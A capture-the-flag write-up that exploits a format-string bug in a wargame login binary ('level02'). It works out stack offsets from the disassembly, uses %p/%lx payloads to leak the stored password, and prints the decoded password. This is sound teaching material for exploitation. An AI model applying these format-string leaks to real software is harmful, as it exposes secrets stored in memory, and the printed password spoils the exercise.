The program waits for a login and a password using fgets.

When we disassemble the program, we can see a few things:
- We have a first buffer that later on used to store the login
- We have a second buffer in which will be stored the actual password
- We have a third buffer for the user inputed password
- At the end, the login buffer is used as a printf format string

We'll use that to display the content of the stack, therefore display the password stored in the second buffer.
Using %p, we'll try to get the offset to read the login buffer:
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAABBBB%28$p
--[ Password:
*****************************************
AAAABBBB0x4242424241414141 does not have access!

We now know the offset of our buffer, the goal now is to find the offset of the password buffer.

When we disassemble the main function, we see all 3 buffers being initialized:
   0x000000000040082c <+24>:	lea    -0x70(%rbp),%rdx  ; 0x7fffffffe520  buffer1 username
   ...
   0x0000000000400849 <+53>:	lea    -0xa0(%rbp),%rdx  ; 0x7fffffffe4f0  buffer2 file
   ...
   0x0000000000400869 <+85>:	lea    -0x110(%rbp),%rdx ; 0x7fffffffe480  buffer3 password
We can see that the second buffer is offseted by 0x30/48 from the first one, since printf shifts 8 by 8, we'll want to move from 28 to 28-48/8, this gives us 22.


level02@OverRide:~$ for((i=0;i<50;i++)); do ./level02 < <(python -c "print('AAAA'  + '%$i"'$'"p\nBBBBBBBB' )") ; done | grep 'does not have access!'


We also now that the size of the buffer is 41 through the disassembled code, so we want to display 40/6=5 chunks through printf

We can now simply use the following login to print the content of password:
['%22$lx', '%23$lx', '%24$lx', '%25$lx', '%26$lx']
Enter any password, and we can see the following:
['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d'] does not have access!

We can now take these 5 integers, reverse the endian, and print them as ascii.
>>> pw = ['756e505234376848', '45414a3561733951', '377a7143574e6758', '354a35686e475873', '48336750664b394d']
>>> "".join([chunk.decode('hex')[::-1] for chunk in pw])
'Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H'

